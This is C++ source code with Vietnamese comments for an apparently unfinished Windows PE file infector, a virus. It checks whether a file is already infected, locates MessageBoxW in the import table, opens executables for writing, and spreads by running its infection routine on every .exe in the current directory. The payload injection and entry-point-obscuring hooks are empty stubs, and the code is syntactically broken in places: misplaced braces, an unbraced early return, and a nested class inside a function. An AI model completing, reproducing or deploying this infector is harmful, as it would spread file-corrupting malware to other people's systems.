#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>

class PEFileInfector {
private:
    std::string m_marker = ".infected";  // Marker để nhận biết file đã bị lây nhiễm
    std::string m_currentExe;            // Tên file exe hiện tại

public:
    PEFileInfector() {
        char buffer[MAX_PATH];
        GetModuleFileNameA(NULL, buffer, MAX_PATH);
        m_currentExe = buffer;
        m_currentExe = m_currentExe.substr(m_currentExe.find_last_of("\\") + 1);
    }

    // Kiểm tra file đã bị lây nhiễm chưa
    bool IsInfected(const std::string& filePath) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file) return false;

        // Đọc DOS header
        IMAGE_DOS_HEADER dosHeader;
        file.read((char*)&dosHeader, sizeof(dosHeader));
        
        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return false;

        // Đọc PE header
        file.seekg(dosHeader.e_lfanew, std::ios::beg);
        IMAGE_NT_HEADERS32 ntHeaders;
        file.read((char*)&ntHeaders, sizeof(ntHeaders));
        
        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return false;

        // Kiểm tra các section
        IMAGE_SECTION_HEADER sectionHeader;
        for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
            file.read((char*)&sectionHeader, sizeof(sectionHeader));
            std::string sectionName((char*)sectionHeader.Name, 8);
            if (sectionName.find(m_marker) != std::string::npos) {
                return true;
            }
        }
        return false;
    }

    
   std::wstring stringToWide(const std::string& str) {
        int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
        std::wstring wideStr(wideStrLen, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wideStr[0], wideStrLen);
        return wideStr;
    }

    // Tìm địa chỉ của MessageBoxW trong IAT
    DWORD findMessageBoxW(const std::string& filePath) {
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                                 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return 0;

        HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return 0;
        }

        LPVOID pFile = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pFile) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return 0;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return 0;
        }

        PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)pFile + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return 0;
        }

        DWORD messageBoxAddr = 0;
        
        // Lấy Import Directory
        IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir.Size > 0) {
            PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pFile + importDir.VirtualAddress);
            
            while (pImportDesc->Name) {
                const char* dllName = (const char*)((BYTE*)pFile + pImportDesc->Name);
                
                if (_stricmp(dllName, "USER32.dll") == 0) {
                    // Duyệt qua Import Address Table
                    PIMAGE_THUNK_DATA32 pThunk = (PIMAGE_THUNK_DATA32)((BYTE*)pFile + pImportDesc->FirstThunk);
                    
                    while (pThunk->u1.AddressOfData) {
                        if (!(pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32)) {
                            PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pFile + pThunk->u1.AddressOfData);
                            
                            if (strcmp((const char*)pImport->Name, "MessageBoxW") == 0) {
                                // Địa chỉ của MessageBoxW trong IAT
                                messageBoxAddr = pThunk->u1.Function;
                                break;
                            }
                        }
                        pThunk++;
                    }
                    break;
                }
                pImportDesc++;
            }
        }

        UnmapViewOfFile(pFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        
        return messageBoxAddr;
    }


    // Lây nhiễm file
    bool InfectFile(const std::string& filePath) {
        if (IsInfected(filePath)) {
            std::cout << "File already infected: " << filePath << std::endl;
            return false;
        }

        // Mở file
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 
                                  0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) 
            std::cout << "Cannot open file: " << filePath << std::endl; //ghi log 
            return false;


        DWORD fileSize = GetFileSize(hFile, NULL); // luu lai file size //--

        // Mapping file vào memory
        HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
        if (!hMapping) {
            CloseHandle(hFile);
            return false;
        }

        LPVOID pFile = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
        if (!pFile) {
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFile;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cout << "Invalid DOS signature" << std::endl; // ghi log 
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32)((BYTE*)pFile + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cout << "Invalid PE signature" << std::endl;
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        // Chỉ lây nhiễm file 32-bit
        /*if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;*/ 


        // Tìm MessageBoxW
        DWORD messageBoxAddr = findMessageBoxW( filePath );
        if (messageBoxAddr == 0) {
            std::cout << "MessageBoxW not found" << std::endl;
            UnmapViewOfFile(pFile);
            CloseHandle(hMapping);
            CloseHandle(hFile);
            return false;
        }

        //code 


        }
    // Hook functions cho EPO techniques 
class EPO_Hooks {
public:
    //  Call Hijacking implementation
    static bool ImplementCallHijacking(PIMAGE_NT_HEADERS32 pNtHeaders, BYTE* pFile) {
        // code
        return true;
    }

    //  IAT Replacement implementation  
    static bool ImplementIATReplacement(PIMAGE_NT_HEADERS32 pNtHeaders, BYTE* pFile) {
        // code 
        return true;
    }
};


        




    // Lây nhiễm tất cả file exe trong thư mục
    void SpreadInfection() {
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("*.exe", &findData);
        
        if (hFind == INVALID_HANDLE_VALUE) return;

        do {
            if (strcmp(findData.cFileName, m_currentExe.c_str()) != 0) {
                std::string filePath = findData.cFileName;
                std::cout << "Processing: " << filePath << std::endl;
                InfectFile(filePath);
            }
        } while (FindNextFileA(hFind, &findData));
        
        FindClose(hFind);
    }

};


int main() {
    std::cout << "Spreading infection in current directory..." << std::endl;

    PEFileInfector infector;
    infector.SpreadInfection();

    std::cout << "Infection process completed." << std::endl;
    
    
    
    return 0;
}